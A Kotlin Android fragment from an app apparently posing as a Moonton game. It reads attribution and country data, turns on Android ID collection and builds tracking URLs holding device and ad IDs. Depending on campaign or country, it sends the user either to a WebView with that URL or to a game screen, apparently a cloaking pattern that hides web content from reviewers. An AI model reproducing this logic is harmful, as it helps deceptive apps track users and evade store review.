package com.moonton.mob

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Toast
import com.appsflyer.AppsFlyerLib
import com.my.tracker.MyTracker
import com.onesignal.OneSignal
import org.json.JSONException
import org.json.JSONObject
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named


class FifthFragment : Fragment() {
    private lateinit var mContext: Context
    val shareP: SharedPreferences by inject(named("SharedPreferences"))

    override fun onAttach(context: Context) {
        super.onAttach(context)
        mContext = context
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        // Inflate the layout for this fragment
        return inflater.inflate(R.layout.fragment_fifth, container, false)
    }

    override fun onStart() {
        super.onStart()
        val count = shareP.getString("country", null)
        val appCamp = shareP.getString("appCamp", null)
        val deepSt = shareP.getString("deepSt", null)
        val countryDev = shareP.getString("countryDev", null)
        val apps = shareP.getString("apps", null)
        val wv = shareP.getString("wv", null)
        val mainId = shareP.getString("mainId", null)
        val pack = BuildConfig.APPLICATION_ID
        val buildVers = Build.VERSION.RELEASE
        val trackerParams = MyTracker.getTrackerParams()
        trackerParams.customUserId = mainId
        val myInstId: String? = shareP.getString("instId", null)

        val intentBeam = Intent(mContext, NewActivity::class.java)
        val intentGame = Intent(mContext, RedirAct::class.java)

        val one = "deviceID="
        val subOne = "sub_id_1="
        val ad_id = "ad_id="
        val subFour = "sub_id_4="
        val subFive = "sub_id_5="
        val subSix = "sub_id_6="
        val namm = "naming"
        val trololo = "deeporg"

        val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(mContext)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        pushToOS(mainId.toString())


        val linkApps = "$wv$subOne$appCamp&$one$afId&$ad_id$mainId&$subFour$pack&$subFive$buildVers&$subSix$namm"
        val linkMT = "$wv$one$mainId&$ad_id$myInstId&$subFour$pack&$subFive$buildVers&$subSix$namm"
        val linkFB = "$wv$subOne$deepSt&$one$afId&$ad_id$mainId&$subFour$pack&$subFive$buildVers&$subSix$trololo"
        val linkFBNullApps = "$wv$subOne$deepSt&$one$mainId&$ad_id$myInstId&$subFour$pack&$subFive$buildVers&$subSix$trololo"

        when(apps) {
            "1" ->
                if(appCamp != "null") {
                    shareP.edit().putString("link", linkApps).apply()
                    startActivity(intentBeam)
                    activity?.finish()
                } else if (deepSt!=null||countryDev!!.contains(count.toString())) {
                    shareP.edit().putString("link", linkFB).apply()
                    startActivity(intentBeam)
                    activity?.finish()
                } else {
                    startActivity(intentGame)
                    activity?.finish()
                }
            "0" ->
                if(deepSt!=null) {
                    shareP.edit().putString("link", linkFBNullApps).apply()
                    startActivity(intentBeam)
                    activity?.finish()
                } else if (countryDev!!.contains(count.toString())) {
                    shareP.edit().putString("link", linkMT).apply()
                    startActivity(intentBeam)
                    activity?.finish()
                } else {
                    startActivity(intentGame)
                    activity?.finish()
                }
        }
    }

    private fun pushToOS(id: String) {
        OneSignal.setExternalUserId(
            id,
            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
                override fun onSuccess(results: JSONObject) {

                    try {
                        if (results.has("push") && results.getJSONObject("push").has("success")) {
                            val isPushSuccess = results.getJSONObject("push").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for push status: $isPushSuccess"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("email") && results.getJSONObject("email").has("success")) {
                            val isEmailSuccess =
                                results.getJSONObject("email").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for email status: $isEmailSuccess"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("sms") && results.getJSONObject("sms").has("success")) {
                            val isSmsSuccess = results.getJSONObject("sms").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for sms status: $isSmsSuccess"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }

                override fun onFailure(error: OneSignal.ExternalIdError) {

                    OneSignal.onesignalLog(
                        OneSignal.LOG_LEVEL.VERBOSE,
                        "Set external user id done with error: $error"
                    )
                }
            })
    }

    }